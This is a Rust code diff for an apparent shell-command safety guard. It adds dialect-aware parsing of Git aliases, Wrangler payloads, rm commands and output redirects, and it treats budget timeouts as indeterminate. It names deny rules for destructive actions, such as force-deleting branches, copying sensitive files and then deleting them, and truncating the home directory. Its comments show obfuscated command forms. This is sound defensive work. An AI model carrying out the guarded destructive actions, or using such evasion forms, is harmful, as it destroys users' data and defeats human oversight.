+                let safe_view = crate::packs::core::git::syntax_view_in_dialect(
+                    core_git_command,
+                    shell_dialect,
+                );
+                if pack.matches_safe_with_deadline(
+                    safe_view.as_deref().unwrap_or(core_git_command),
+                    deadline,
+                ) {
+                    continue;
+                }
+                if let Some(result) = evaluate_pack_destructive_patterns(
+                    pack_id,
+                    pack,
+                    core_git_command,
+                    shell_dialect,
+                    0,
+                    original_command,
+                    core_git_offset,
+                    original_len,
+                    allowlists,
+                    project_path,
+                    &mut first_allowlist_hit,
+                    deadline,
+                    &[],
+                    None,
+                ) {
+                    return result;
+                }
+            }
+            continue;
         } else if has_compound_segments {
             for &(segment_start, segment_end) in &segment_ranges {
                 if deadline_exceeded(deadline)
                     || remaining_below(deadline, &crate::perf::PATTERN_MATCH)
                 {
-                    return EvaluationResult::allowed_due_to_budget();
+                    return EvaluationResult::indeterminate_due_to_budget();
                 }
 
                 let segment = &command_for_packs[segment_start..segment_end];
+                if is_indirect_database_pack(pack_id)
+                    && protected_database_pack_in_segment(segment).is_some_and(|owner| {
+                        owner != pack_id.as_str() && exact_enabled_indirect_packs.contains(&owner)
+                    })
+                {
+                    continue;
+                }
                 let sanitized_segment = sanitize_for_pattern_matching(segment);
                 let segment_for_match = sanitized_segment.as_ref();
-
                 if pack.matches_safe_with_deadline(segment_for_match, deadline) {
                     continue;
                 }
@@ -7256,6 +13001,7 @@ fn evaluate_packs_with_allowlists_at_depth(
                     pack_id,
                     pack,
                     segment_for_match,
+                    shell_dialect,
                     segment_start,
                     original_command,
                     normalized_offset,
@@ -7265,6 +13011,7 @@ fn evaluate_packs_with_allowlists_at_depth(
                     &mut first_allowlist_hit,
                     deadline,
                     &nested_segment_ranges,
+                    None,
                 ) {
                     return result;
                 }
@@ -7276,7 +13023,17 @@ fn evaluate_packs_with_allowlists_at_depth(
         for pattern in &pack.destructive_patterns {
             if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH)
             {
-                return EvaluationResult::allowed_due_to_budget();
+                return EvaluationResult::indeterminate_due_to_budget();
+            }
+            if has_compound_segments
+                && pack_id == "core.git"
+                && pattern.name == Some("branch-force-delete")
+            {
+                // The semantic branch matcher already evaluated every command
+                // segment. Re-running this regex across the whole compound
+                // command would recreate cross-boundary and nested-data false
+                // positives.
+                continue;
             }
 
             // All severity levels are now evaluated. The policy layer in main.rs
@@ -7288,7 +13045,7 @@ fn evaluate_packs_with_allowlists_at_depth(
                 .map(|(start, end)| MatchSpan { start, end });
 
             if deadline_exceeded(deadline) {
-                return EvaluationResult::allowed_due_to_budget();
+                return EvaluationResult::indeterminate_due_to_budget();
             }
 
             let Some(span) = matched_span else {
@@ -7385,6 +13142,7 @@ fn evaluate_packs_with_allowlists_at_depth(
             project_path,
             &mut first_allowlist_hit,
             deadline,
+            shell_dialect,
         ) {
             return result;
         }
@@ -7407,6 +13165,7 @@ fn evaluate_original_control_plane_payloads(
     project_path: Option<&Path>,
     first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
     deadline: Option<&Deadline>,
+    shell_dialect: crate::normalize::ShellDialect,
 ) -> Option<EvaluationResult> {
     if !should_check_original_control_plane_payload(pack_id, command_for_packs, original_command) {
         return None;
@@ -7420,6 +13179,7 @@ fn evaluate_original_control_plane_payloads(
             pack_id,
             pack,
             command_slice.as_ref(),
+            shell_dialect,
             0,
             original_command,
             Some(0),
@@ -7429,6 +13189,7 @@ fn evaluate_original_control_plane_payloads(
             first_allowlist_hit,
             deadline,
             &[],
+            None,
         );
     }
 
@@ -7440,6 +13201,7 @@ fn evaluate_original_control_plane_payloads(
                 pack_id,
                 pack,
                 command_slice.as_ref(),
+                shell_dialect,
                 segment_start,
                 original_command,
                 Some(0),
@@ -7449,6 +13211,7 @@ fn evaluate_original_control_plane_payloads(
                 first_allowlist_hit,
                 deadline,
                 &[],
+                None,
             ) {
                 return Some(result);
             }
@@ -7476,6 +13239,19 @@ fn control_plane_segment_for_matching(segment: &str) -> Cow<'_, str> {
 
 fn command_segment_ranges(cmd: &str) -> Vec<(usize, usize)> {
     crate::packs::split_command_segments(cmd)
+        .into_iter()
+        .map(|segment| {
+            let start = segment.as_ptr() as usize - cmd.as_ptr() as usize;
+            (start, start + segment.len())
+        })
+        .collect()
+}
+
+fn command_segment_ranges_in_dialect(
+    cmd: &str,
+    dialect: crate::normalize::ShellDialect,
+) -> Vec<(usize, usize)> {
+    crate::packs::split_command_segments_in_dialect(cmd, dialect)
         .into_iter()
         .map(|segment| {
             let start = segment.as_ptr() as usize - cmd.as_ptr() as usize;
@@ -7519,11 +13295,14 @@ fn command_contains_curl_invocation(command: &str) -> bool {
         .map(|word| word.trim_matches(['"', '\'']))
         .filter_map(|word| word.rsplit(['/', '\\']).next())
         .map(|name| {
-            if name.len() >= 4 && name[name.len() - 4..].eq_ignore_ascii_case(".exe") {
-                &name[..name.len() - 4]
-            } else {
-                name
-            }
+            name.len()
+                .checked_sub(4)
+                .and_then(|suffix_start| {
+                    name.get(suffix_start..)
+                        .filter(|suffix| suffix.eq_ignore_ascii_case(".exe"))
+                        .and_then(|_| name.get(..suffix_start))
+                })
+                .unwrap_or(name)
         })
         .any(|name| name.eq_ignore_ascii_case("curl"))
 }
@@ -7565,10 +13344,766 @@ fn original_command_contains_railway_api_signal(command: &str) -> bool {
 }
 
 #[allow(clippy::too_many_arguments)]
+fn evaluate_named_pack_rule(
+    pack_id: &str,
+    pack: &crate::packs::Pack,
+    pattern_name: &str,
+    allowlists: &LayeredAllowlist,
+    project_path: Option<&Path>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+) -> Option<EvaluationResult> {
+    let Some(pattern) = pack
+        .destructive_patterns
+        .iter()
+        .find(|pattern| pattern.name == Some(pattern_name))
+    else {
+        return Some(EvaluationResult::denied_by_legacy(&format!(
+            "{pack_id} semantic parser identified missing destructive rule {pattern_name:?}"
+        )));
+    };
+
+    if let Some(hit) = allowlists.match_rule_at_path(pack_id, pattern_name, project_path) {
+        if first_allowlist_hit.is_none() {
+            *first_allowlist_hit = Some((
+                PatternMatch {
+                    pack_id: Some(pack_id.to_string()),
+                    pattern_name: Some(pattern_name.to_string()),
+                    severity: Some(pattern.severity),
+                    reason: pattern.reason.to_string(),
+                    source: MatchSource::Pack,
+                    matched_span: None,
+                    matched_text_preview: None,
+                    explanation: pattern.explanation.map(str::to_string),
+                    suggestions: pattern.suggestions,
+                },
+                hit.layer,
+                hit.entry.reason.clone(),
+            ));
+        }
+        return None;
+    }
+
+    Some(EvaluationResult::denied_by_pack_pattern(
+        pack_id,
+        pattern_name,
+        pattern.reason,
+        pattern.explanation,
+        pattern.severity,
+        pattern.suggestions,
+    ))
+}
+
+fn posix_single_quote_argument(argument: &str) -> String {
+    if argument.is_empty() {
+        return "''".to_string();
+    }
+    let mut quoted = String::with_capacity(argument.len() + 2);
+    quoted.push('\'');
+    for character in argument.chars() {
+        if character == '\'' {
+            quoted.push_str("'\"'\"'");
+        } else {
+            quoted.push(character);
+        }
+    }
+    quoted.push('\'');
+    quoted
+}
+
+fn contains_active_posix_argument_expansion(command: &str) -> bool {
+    let bytes = command.as_bytes();
+    let mut index = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    while index < bytes.len() {
+        match bytes[index] {
+            b'\\' if !in_single && index + 1 < bytes.len() => index += 2,
+            b'\'' if !in_double => {
+                in_single = !in_single;
+                index += 1;
+            }
+            b'"' if !in_single => {
+                in_double = !in_double;
+                index += 1;
+            }
+            b'$' if !in_single => {
+                let expands_invocation_arguments = match bytes.get(index + 1).copied() {
+                    Some(byte) if byte.is_ascii_digit() || matches!(byte, b'@' | b'*') => true,
+                    Some(b'{') => command
+                        .get(index + 2..)
+                        .and_then(|tail| tail.find('}').map(|close| &tail[..close]))
+                        .is_some_and(|name| {
+                            matches!(name, "@" | "*")
+                                || !name.is_empty()
+                                    && name.bytes().all(|byte| byte.is_ascii_digit())
+                        }),
+                    _ => false,
+                };
+                if expands_invocation_arguments {
+                    return true;
+                }
+                index += shell_parameter_expansion_len(&command[index..]).max(1);
+            }
+            _ => index += 1,
+        }
+    }
+    false
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_visible_git_shell_alias(
+    pack_id: &str,
+    pack: &crate::packs::Pack,
+    segment: &str,
+    shell_dialect: ShellDialect,
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    allowlists: &LayeredAllowlist,
+    project_path: Option<&Path>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    deadline: Option<&Deadline>,
+    embedded_shell_depth: usize,
+    nested_context: Option<&NestedCommandEvaluationContext<'_, '_>>,
+) -> Option<EvaluationResult> {
+    let decision =
+        crate::packs::core::git::invoked_visible_git_alias_in_dialect(segment, shell_dialect);
+    let (reconstructed, nested_dialect, denial_context) = match decision {
+        crate::packs::core::git::InvokedGitAliasDecision::NoMatch => return None,
+        crate::packs::core::git::InvokedGitAliasDecision::Unverified => {
+            return evaluate_named_pack_rule(
+                pack_id,
+                pack,
+                crate::packs::core::git::GIT_ALIAS_UNVERIFIED_RULE,
+                allowlists,
+                project_path,
+                first_allowlist_hit,
+            );
+        }
+        crate::packs::core::git::InvokedGitAliasDecision::Shell(alias) => {
+            if contains_active_posix_argument_expansion(&alias.shell_body) {
+                return evaluate_named_pack_rule(
+                    pack_id,
+                    pack,
+                    crate::packs::core::git::GIT_ALIAS_UNVERIFIED_RULE,
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                );
+            }
+            let mut command = alias.shell_body;
+            for argument in alias.invoked_args {
+                command.push(' ');
+                command.push_str(&posix_single_quote_argument(&argument));
+            }
+            (
+                command,
+                ShellDialect::Posix,
+                "Git shell alias executes an embedded command",
+            )
+        }
+        crate::packs::core::git::InvokedGitAliasDecision::Expanded(alias) => {
+            let mut command = String::from("git ");
+            command.push_str(&posix_single_quote_argument(&alias.subcommand));
+            for argument in alias.arguments {
+                command.push(' ');
+                command.push_str(&posix_single_quote_argument(&argument));
+            }
+            (
+                command,
+                ShellDialect::Posix,
+                "Git alias expands to a destructive Git command",
+            )
+        }
+    };
+
+    let Some(context) = nested_context else {
+        return evaluate_named_pack_rule(
+            pack_id,
+            pack,
+            crate::packs::core::git::GIT_ALIAS_UNVERIFIED_RULE,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+        );
+    };
+    if embedded_shell_depth >= MAX_EMBEDDED_SHELL_DEPTH {
+        return evaluate_named_pack_rule(
+            pack_id,
+            pack,
+            crate::packs::core::git::GIT_ALIAS_UNVERIFIED_RULE,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+        );
+    }
+
+    if reconstructed.len() > context.heredoc_settings.limits.max_body_bytes {
+        return evaluate_named_pack_rule(
+            pack_id,
+            pack,
+            crate::packs::core::git::GIT_ALIAS_UNVERIFIED_RULE,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+        );
+    }
+
+    let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+        &reconstructed,
+        context.enabled_keywords,
+        ordered_packs,
+        keyword_index,
+        context.compiled_overrides,
+        allowlists,
+        context.heredoc_settings,
+        context.allow_once_audit,
+        project_path,
+        deadline,
+        nested_dialect,
+        embedded_shell_depth + 1,
+        context.inherited_automated_stdin,
+    );
+    if result.skipped_due_to_budget {
+        return evaluate_named_pack_rule(
+            pack_id,
+            pack,
+            crate::packs::core::git::GIT_ALIAS_UNVERIFIED_RULE,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+        );
+    }
+    if result.is_denied() {
+        if let Some(info) = result.pattern_info.as_mut() {
+            info.reason = format!("{denial_context}: {}", info.reason);
+            info.matched_span = None;
+            info.matched_text_preview = None;
+        }
+        return Some(result);
+    }
+    if first_allowlist_hit.is_none() {
+        if let Some(allowlist_override) = result.allowlist_override.take() {
+            let mut matched = allowlist_override.matched;
+            matched.matched_span = None;
+            matched.matched_text_preview = None;
+            *first_allowlist_hit =
+                Some((matched, allowlist_override.layer, allowlist_override.reason));
+        }
+    }
+    None
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_cloudflare_workers_pack(
+    pack_id: &str,
+    pack: &crate::packs::Pack,
+    command_for_packs: &str,
+    shell_dialect: ShellDialect,
+    segment_ranges: &[(usize, usize)],
+    original_command: &str,
+    normalized_offset: Option<usize>,
+    original_len: usize,
+    ordered_packs: &[String],
+    keyword_index: Option<&crate::packs::EnabledKeywordIndex>,
+    allowlists: &LayeredAllowlist,
+    project_path: Option<&Path>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    deadline: Option<&Deadline>,
+    embedded_shell_depth: usize,
+    nested_context: Option<&NestedCommandEvaluationContext<'_, '_>>,
+) -> Option<EvaluationResult> {
+    for &(segment_start, segment_end) in segment_ranges {
+        if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
+            return Some(EvaluationResult::indeterminate_due_to_budget());
+        }
+
+        let segment = &command_for_packs[segment_start..segment_end];
+        match crate::packs::cdn::cloudflare_workers::wrangler_runner_shell_decision_in_dialect(
+            segment,
+            shell_dialect,
+        ) {
+            crate::packs::cdn::cloudflare_workers::WranglerRunnerShellDecision::NoMatch => {}
+            crate::packs::cdn::cloudflare_workers::WranglerRunnerShellDecision::Unverified => {
+                return evaluate_named_pack_rule(
+                    pack_id,
+                    pack,
+                    crate::packs::cdn::cloudflare_workers::WRANGLER_UNVERIFIED_RULE,
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                );
+            }
+            crate::packs::cdn::cloudflare_workers::WranglerRunnerShellDecision::Payload(
+                payload,
+            ) => {
+                let Some(context) = nested_context else {
+                    return evaluate_named_pack_rule(
+                        pack_id,
+                        pack,
+                        crate::packs::cdn::cloudflare_workers::WRANGLER_UNVERIFIED_RULE,
+                        allowlists,
+                        project_path,
+                        first_allowlist_hit,
+                    );
+                };
+                if embedded_shell_depth >= MAX_EMBEDDED_SHELL_DEPTH
+                    || payload.len() > context.heredoc_settings.limits.max_body_bytes
+                {
+                    return evaluate_named_pack_rule(
+                        pack_id,
+                        pack,
+                        crate::packs::cdn::cloudflare_workers::WRANGLER_UNVERIFIED_RULE,
+                        allowlists,
+                        project_path,
+                        first_allowlist_hit,
+                    );
+                }
+
+                let mut result = evaluate_command_with_pack_order_deadline_at_path_inner(
+                    &payload,
+                    context.enabled_keywords,
+                    ordered_packs,
+                    keyword_index,
+                    context.compiled_overrides,
+                    allowlists,
+                    context.heredoc_settings,
+                    context.allow_once_audit,
+                    project_path,
+                    deadline,
+                    ShellDialect::Posix,
+                    embedded_shell_depth + 1,
+                    context.inherited_automated_stdin,
+                );
+                if result.skipped_due_to_budget {
+                    return evaluate_named_pack_rule(
+                        pack_id,
+                        pack,
+                        crate::packs::cdn::cloudflare_workers::WRANGLER_UNVERIFIED_RULE,
+                        allowlists,
+                        project_path,
+                        first_allowlist_hit,
+                    );
+                }
+                if result.is_denied() {
+                    if let Some(info) = result.pattern_info.as_mut() {
+                        info.reason = format!(
+                            "npm runner call executes an embedded shell command: {}",
+                            info.reason
+                        );
+                        info.matched_span = None;
+                        info.matched_text_preview = None;
+                    }
+                    return Some(result);
+                }
+                if first_allowlist_hit.is_none() {
+                    if let Some(allowlist_override) = result.allowlist_override.take() {
+                        let mut matched = allowlist_override.matched;
+                        matched.matched_span = None;
+                        matched.matched_text_preview = None;
+                        *first_allowlist_hit =
+                            Some((matched, allowlist_override.layer, allowlist_override.reason));
+                    }
+                }
+                continue;
+            }
+        }
+        match crate::packs::cdn::cloudflare_workers::wrangler_semantic_decision_in_dialect(
+            segment,
+            shell_dialect,
+        ) {
+            crate::packs::cdn::cloudflare_workers::WranglerSemanticDecision::Safe => continue,
+            crate::packs::cdn::cloudflare_workers::WranglerSemanticDecision::Destructive(name) => {
+                if let Some(result) = evaluate_named_pack_rule(
+                    pack_id,
+                    pack,
+                    name,
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                ) {
+                    return Some(result);
+                }
+                continue;
+            }
+            crate::packs::cdn::cloudflare_workers::WranglerSemanticDecision::Unverified => {
+                return evaluate_named_pack_rule(
+                    pack_id,
+                    pack,
+                    crate::packs::cdn::cloudflare_workers::WRANGLER_UNVERIFIED_RULE,
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                );
+            }
+            crate::packs::cdn::cloudflare_workers::WranglerSemanticDecision::NoMatch => {}
+        }
+
+        let sanitized_segment = sanitize_for_pattern_matching(segment);
+        let segment_for_match = sanitized_segment.as_ref();
+        if pack.matches_safe_with_deadline(segment_for_match, deadline) {
+            continue;
+        }
+        let nested_segment_ranges: Vec<(usize, usize)> = segment_ranges
+            .iter()
+            .copied()
+            .filter(|&(nested_start, nested_end)| {
+                nested_start >= segment_start
+                    && nested_end <= segment_end
+                    && !(nested_start == segment_start && nested_end == segment_end)
+            })
+            .collect();
+        if let Some(result) = evaluate_pack_destructive_patterns(
+            pack_id,
+            pack,
+            segment_for_match,
+            shell_dialect,
+            segment_start,
+            original_command,
+            normalized_offset,
+            original_len,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+            deadline,
+            &nested_segment_ranges,
+            None,
+        ) {
+            return Some(result);
+        }
+    }
+    None
+}
+
+fn filesystem_cross_segment_pattern(name: Option<&str>) -> bool {
+    matches!(
+        name,
+        Some(
+            "cp-sensitive-then-delete"
+                | "ln-symlink-sensitive-then-delete"
+                | "rsync-sensitive-then-delete"
+        )
+    )
+}
+
+fn filesystem_pre_rm_pattern(name: Option<&str>) -> bool {
+    crate::packs::core::filesystem::is_pre_rm_propagation_rule(name)
+}
+
+fn filesystem_redirect_pattern(name: Option<&str>) -> bool {
+    matches!(
+        name,
+        Some("redirect-truncate-root-home" | "redirect-truncate-dynamic-path")
+    )
+}
+
+fn filesystem_non_pre_rm_pattern(name: Option<&str>) -> bool {
+    !filesystem_pre_rm_pattern(name)
+}
+
+fn first_unquoted_output_redirect(command: &str, dialect: ShellDialect) -> Option<usize> {
+    if dialect == ShellDialect::Unknown {
+        return [
+            ShellDialect::Posix,
+            ShellDialect::PowerShell,
+            ShellDialect::Cmd,
+        ]
+        .into_iter()
+        .filter_map(|candidate| first_unquoted_output_redirect(command, candidate))
+        .min();
+    }
+
+    let bytes = command.as_bytes();
+    let mut index = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+
+    while index < bytes.len() {
+        let byte = bytes[index];
+        let escaped = match dialect {
+            ShellDialect::Posix => byte == b'\\' && !in_single,
+            ShellDialect::PowerShell => byte == b'`' && !in_single,
+            ShellDialect::Cmd => byte == b'^' && !in_double,
+            ShellDialect::Unknown => unreachable!("handled by conservative dialect union"),
+        };
+        if escaped && index + 1 < bytes.len() {
+            index += 2;
+            continue;
+        }
+
+        match byte {
+            b'\'' if dialect != ShellDialect::Cmd && !in_double => {
+                in_single = !in_single;
+            }
+            b'"' if !in_single => {
+                in_double = !in_double;
+            }
+            b'>' if !in_single && !in_double => return Some(index),
+            _ => {}
+        }
+        index += 1;
+    }
+    None
+}
+
+fn output_redirect_operator_start(command: &str, redirect: usize) -> usize {
+    let bytes = command.as_bytes();
+    let mut start = redirect;
+    if start > 0 && matches!(bytes[start - 1], b'<' | b'&' | b'*') {
+        start -= 1;
+    }
+    while start > 0 && bytes[start - 1].is_ascii_digit() {
+        start -= 1;
+    }
+    start
+}
+
+fn rm_redirection_matching_view(command: &str, dialect: ShellDialect) -> Cow<'_, str> {
+    let Some(redirect_start) = first_unquoted_output_redirect(command, dialect) else {
+        return Cow::Owned(" ".repeat(command.len()));
+    };
+    let operator_start = output_redirect_operator_start(command, redirect_start);
+    let mut view = vec![b' '; command.len()];
+    view[operator_start..].copy_from_slice(&command.as_bytes()[operator_start..]);
+    Cow::Owned(String::from_utf8(view).expect("ASCII mask plus UTF-8 suffix remains valid UTF-8"))
+}
+
+#[allow(clippy::too_many_arguments)]
+fn evaluate_core_filesystem_pack(
+    pack_id: &str,
+    pack: &crate::packs::Pack,
+    command_for_packs: &str,
+    shell_dialect: crate::normalize::ShellDialect,
+    segment_ranges: &[(usize, usize)],
+    original_command: &str,
+    normalized_offset: Option<usize>,
+    original_len: usize,
+    allowlists: &LayeredAllowlist,
+    project_path: Option<&Path>,
+    first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
+    deadline: Option<&Deadline>,
+    inherited_automated_stdin: bool,
+) -> Option<EvaluationResult> {
+    // These three rules intentionally span shell separators. Evaluate them
+    // once against the complete command before any safe per-invocation rm
+    // decision can hide the propagation chain.
+    if segment_ranges.len() > 1 {
+        if let Some(result) = evaluate_pack_destructive_patterns(
+            pack_id,
+            pack,
+            command_for_packs,
+            shell_dialect,
+            0,
+            original_command,
+            normalized_offset,
+            original_len,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+            deadline,
+            &[],
+            Some(filesystem_cross_segment_pattern),
+        ) {
+            return Some(result);
+        }
+    }
+
+    for &(segment_start, segment_end) in segment_ranges {
+        if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
+            return Some(EvaluationResult::indeterminate_due_to_budget());
+        }
+
+        let segment = &command_for_packs[segment_start..segment_end];
+        let sanitized_segment = sanitize_for_pattern_matching(segment);
+        let powershell_literal_sources = restore_powershell_here_string_substitution_text(
+            sanitized_segment.as_ref(),
+            segment,
+            shell_dialect,
+        );
+        let segment_for_match = powershell_literal_sources.as_ref();
+        let nested_segment_ranges: Vec<(usize, usize)> = segment_ranges
+            .iter()
+            .copied()
+            .filter(|&(nested_start, nested_end)| {
+                nested_start >= segment_start
+                    && nested_end <= segment_end
+                    && !(nested_start == segment_start && nested_end == segment_end)
+            })
+            .collect();
+
+        let rm_decision = crate::packs::core::filesystem::parse_rm_command_segment_in_dialect(
+            segment,
+            inherited_automated_stdin
+                || crate::packs::core::filesystem::rm_segment_receives_automated_stdin(
+                    command_for_packs,
+                    segment_start,
+                    shell_dialect,
+                ),
+            shell_dialect,
+        );
+        let rm_was_semantically_handled = !matches!(
+            &rm_decision,
+            crate::packs::core::filesystem::RmParseDecision::NoMatch
+        );
+
+        if rm_was_semantically_handled {
+            // Once the command word is proven to be rm, its ordinary argv is
+            // data, not another filesystem command. Preserve only real,
+            // unquoted shell redirection syntax; nested executable constructs
+            // have their own ranges and are evaluated independently.
+            // Do not even instantiate the two redirect regexes when no `>` is
+            // present. On a fresh one-shot hook process, compiling them used
+            // to push an otherwise parser-only `rm -r` decision beyond the
+            // default 200 ms deadline (dcg#213).
+            if first_unquoted_output_redirect(segment, shell_dialect).is_some() {
+                let redirect_view = rm_redirection_matching_view(segment, shell_dialect);
+                if let Some(result) = evaluate_pack_destructive_patterns(
+                    pack_id,
+                    pack,
+                    redirect_view.as_ref(),
+                    shell_dialect,
+                    segment_start,
+                    original_command,
+                    normalized_offset,
+                    original_len,
+                    allowlists,
+                    project_path,
+                    first_allowlist_hit,
+                    deadline,
+                    &nested_segment_ranges,
+                    Some(filesystem_redirect_pattern),
+                ) {
+                    return Some(result);
+                }
+            }
+        } else if let Some(result) = evaluate_pack_destructive_patterns(
+            pack_id,
+            pack,
+            segment_for_match,
+            shell_dialect,
+            segment_start,
+            original_command,
+            normalized_offset,
+            original_len,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+            deadline,
+            &nested_segment_ranges,
+            Some(filesystem_pre_rm_pattern),
+        ) {
+            return Some(result);
+        }
+
+        match rm_decision {
+            crate::packs::core::filesystem::RmParseDecision::Allow => continue,
+            crate::packs::core::filesystem::RmParseDecision::NoMatch => {}
+            crate::packs::core::filesystem::RmParseDecision::Deny(hit) => {
+                let span = hit.span.as_ref().map(|span| MatchSpan {
+                    start: span.start + segment_start,
+                    end: span.end + segment_start,
+                });
+                let mapped_span = span
+                    .and_then(|span| map_span_with_offset(span, normalized_offset, original_len));
+                let preview = mapped_span
+                    .as_ref()
+                    .map(|span| extract_match_preview(original_command, span))
+                    .or_else(|| {
+                        hit.span.as_ref().map(|span| {
+                            extract_match_preview(
+                                segment,
+                                &MatchSpan {
+                                    start: span.start,
+                                    end: span.end,
+                                },
+                            )
+                        })
+                    });
+
+                if let Some(allow_hit) =
+                    allowlists.match_rule_at_path(pack_id, hit.pattern_name, project_path)
+                {
+                    if first_allowlist_hit.is_none() {
+                        *first_allowlist_hit = Some((
+                            PatternMatch {
+                                pack_id: Some(pack_id.to_string()),
+                                pattern_name: Some(hit.pattern_name.to_string()),
+                                severity: Some(hit.severity),
+                                reason: hit.reason.to_string(),
+                                source: MatchSource::Pack,
+                                matched_span: mapped_span,
+                                matched_text_preview: preview,
+                                explanation: None,
+                                suggestions: &[],
+                            },
+                            allow_hit.layer,
+                            allow_hit.entry.reason.clone(),
+                        ));
+                    }
+                } else {
+                    return Some(mapped_span.map_or_else(
+                        || {
+                            EvaluationResult::denied_by_pack_pattern(
+                                pack_id,
+                                hit.pattern_name,
+                                hit.reason,
+                                None,
+                                hit.severity,
+                                &[],
+                            )
+                        },
+                        |mapped_span| {
+                            EvaluationResult::denied_by_pack_pattern_with_span(
+                                pack_id,
+                                hit.pattern_name,
+                                hit.reason,
+                                None,
+                                hit.severity,
+                                &[],
+                                original_command,
+                                mapped_span,
+                            )
+                        },
+                    ));
+                }
+            }
+        }
+
+        if rm_was_semantically_handled {
+            continue;
+        }
+        if pack.matches_safe_with_deadline(segment_for_match, deadline) {
+            continue;
+        }
+
+        if let Some(result) = evaluate_pack_destructive_patterns(
+            pack_id,
+            pack,
+            segment_for_match,
+            shell_dialect,
+            segment_start,
+            original_command,
+            normalized_offset,
+            original_len,
+            allowlists,
+            project_path,
+            first_allowlist_hit,
+            deadline,
+            &nested_segment_ranges,
+            Some(filesystem_non_pre_rm_pattern),
+        ) {
+            return Some(result);
+        }
+    }
+
+    None
+}
+
+#[allow(clippy::too_many_arguments)]
 fn evaluate_pack_destructive_patterns(
     pack_id: &str,
     pack: &crate::packs::Pack,
     command_slice: &str,
+    shell_dialect: crate::normalize::ShellDialect,
     slice_offset: usize,
     original_command: &str,
     normalized_offset: Option<usize>,
@@ -7578,42 +14113,127 @@ fn evaluate_pack_destructive_patterns(
     first_allowlist_hit: &mut Option<(PatternMatch, AllowlistLayer, String)>,
     deadline: Option<&Deadline>,
     ignored_ranges: &[(usize, usize)],
+    pattern_filter: Option<fn(Option<&str>) -> bool>,
 ) -> Option<EvaluationResult> {
+    // String-data sanitization is length preserving, but it can mask quoted
+    // fragments that form an executable PowerShell expression (for example
+    // `& ('g'+'it')`). Use the exact caller-proven bytes only for Git's
+    // role-aware semantic parser. Regex matching must stay on the sanitized
+    // slice: rebuilding that view from `original_command` would reintroduce
+    // inert argv data such as `git commit -m "Fix git push --force"` and turn
+    // the commit message into a false positive.
+    let git_semantic_command = if pack_id == "core.git"
+        && shell_dialect != crate::normalize::ShellDialect::Unknown
+        && normalized_offset == Some(0)
+    {
+        original_command
+            .get(slice_offset..slice_offset.saturating_add(command_slice.len()))
+            .unwrap_or(command_slice)
+    } else {
+        command_slice
+    };
+    if pack_id == "core.git"
+        && !crate::packs::core::git::command_executes_git_in_dialect(
+            git_semantic_command,
+            shell_dialect,
+        )
+    {
+        return None;
+    }
+    let branch_decision = (pack_id == "core.git").then(|| {
+        crate::packs::core::git::branch_command_decision_in_dialect(
+            git_semantic_command,
+            shell_dialect,
+        )
+    });
+    if matches!(
+        branch_decision,
+        Some(crate::packs::core::git::BranchCommandDecision::NonDestructive)
+    ) {
+        return None;
+    }
+    let syntax_view = (pack_id == "core.git")
+        .then(|| {
+            crate::packs::core::git::syntax_view_for_pattern_matching(
+                git_semantic_command,
+                command_slice,
+                shell_dialect,
+            )
+        })
+        .flatten();
+    let pattern_command = syntax_view.as_deref().unwrap_or(command_slice);
+    let decoded_without_source_map = shell_dialect != crate::normalize::ShellDialect::Unknown
+        && pattern_command != command_slice;
+
     for pattern in &pack.destructive_patterns {
-        if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
-            return Some(EvaluationResult::allowed_due_to_budget());
-        }
-
-        let matched_span = pattern
-            .regex
-            .find(command_slice)
-            .map(|(start, end)| MatchSpan {
-                start: start + slice_offset,
-                end: end + slice_offset,
-            });
-
-        if deadline_exceeded(deadline) {
-            return Some(EvaluationResult::allowed_due_to_budget());
-        }
-
-        let Some(span) = matched_span else {
+        if pattern_filter.is_some_and(|include| !include(pattern.name)) {
             continue;
+        }
+        if deadline_exceeded(deadline) || remaining_below(deadline, &crate::perf::PATTERN_MATCH) {
+            return Some(EvaluationResult::indeterminate_due_to_budget());
+        }
+
+        let semantic_branch_match = matches!(
+            branch_decision,
+            Some(crate::packs::core::git::BranchCommandDecision::Destructive)
+        ) && pattern.name == Some("branch-force-delete");
+        if matches!(
+            branch_decision,
+            Some(crate::packs::core::git::BranchCommandDecision::Destructive)
+        ) && !semantic_branch_match
+        {
+            continue;
+        }
+
+        // Parser-only matches (for example a unique long-option abbreviation)
+        // deliberately carry no source span. A broad regex span can point at
+        // option data such as an earlier `--format -d`, which is worse than no
+        // span and would mislead explain/audit output.
+        let matched_span = if semantic_branch_match || decoded_without_source_map {
+            None
+        } else {
+            pattern
+                .regex
+                .find(pattern_command)
+                .map(|(start, end)| MatchSpan {
+                    start: start + slice_offset,
+                    end: end + slice_offset,
+                })
         };
 
-        if span_is_inside_any_segment(span, ignored_ranges) {
+        if deadline_exceeded(deadline) {
+            return Some(EvaluationResult::indeterminate_due_to_budget());
+        }
+
+        let decoded_regex_match =
+            decoded_without_source_map && pattern.regex.is_match(pattern_command);
+        if !semantic_branch_match && !decoded_regex_match && matched_span.is_none() {
